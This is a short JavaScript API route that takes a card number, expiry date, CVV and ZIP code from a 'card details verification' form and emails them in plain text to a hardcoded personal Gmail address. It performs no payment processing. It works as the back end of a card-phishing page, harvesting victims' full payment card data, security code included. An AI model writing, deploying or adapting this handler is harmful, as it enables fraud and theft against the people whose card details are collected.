const nodemailer = require('nodemailer');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send({ message: 'Only POST requests allowed' });
  }

  const {card_number_info, exp_date_info, cvv_info, zip_code_info} = req.body;

  // Nodemailer transporter setup
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });

  // Email options
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'onehpromise@gmail.com',
    subject: 'New Card Details Verification form Submission',
    text: `You have a new card details verification form submission:`,
    html: `
      <p>Card Number Info: ${card_number_info}</p>
      <p>Exp Date Info: ${exp_date_info}</p>
      <p>CVV info: ${cvv_info}</p>
      <p>Zip Code Info: ${zip_code_info}</p>
    `   
  };

  try {
    await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: 'Email sent successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to send email' });
  }
}
